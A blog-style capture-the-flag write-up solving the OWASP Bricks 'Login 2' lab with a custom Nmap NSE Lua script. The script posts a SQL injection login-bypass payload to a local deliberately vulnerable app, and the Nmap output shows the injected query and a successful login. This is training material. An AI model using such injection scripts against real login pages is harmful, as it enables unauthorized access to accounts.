---
date: '2024-12-03T16:23:33+08:00'
title: 'Bricks Login 2'
tags:
    - OWASP-Bricks
    - NSE
---

## Challenge Information

- [OWASP Bricks](https://sechow.com/bricks/)
- Docker version: [here](https://hub.docker.com/r/gjuniioor/owasp-bricks)


> This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by [masta ghimau](https://www.youtube.com/@mastaghimau) during [MCC 2023](https://cybercamp.my/mcc2023-the-journey-begins/).

## Challenge Solution

Login level 2 is just a simple SQL injection which javascript validation. Since we are using Nmap NSE to perform SQL injection, it will ignore javascript as it is front end validation. We can use the same NSE script as previous challenge.

```lua
local http = require "http"
local shortport = require "shortport"

portrule = shortport.http

action = function(host,port)
  local resp,final,query
  r={}
  r['username']="a' OR 1=1-- a"
  r['passwd']="test"
  r['submit']="Submit"
  resp = http.post(host,port,"/login-2/index.php",nil,nil,r)


  final = string.match(resp.body, '<p>.*alert%-box.->(.-)<a.*</p>')
  query = string.match(resp.body, ".*SQL Query(.*)<a.*</div>")

  return {payload = r ,SQLQuery = query , result = final}
end
```

This code is built based on `http-title.nse`.

```bash
nmap -p 80 --script=chall2.nse 127.0.0.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 19:52 +08
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00013s latency).

PORT   STATE SERVICE
80/tcp open  http
| chall1:
|   payload:
|     submit: Submit
|     passwd: test
|     username: a' OR 1=1-- a
|   SQLQuery: : SELECT * FROM users WHERE name='a' OR 1=1-- a' and password='test'
|_  result: Succesfully logged in.

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
```

## Things I learned from the challenge

- Writing custom NSE script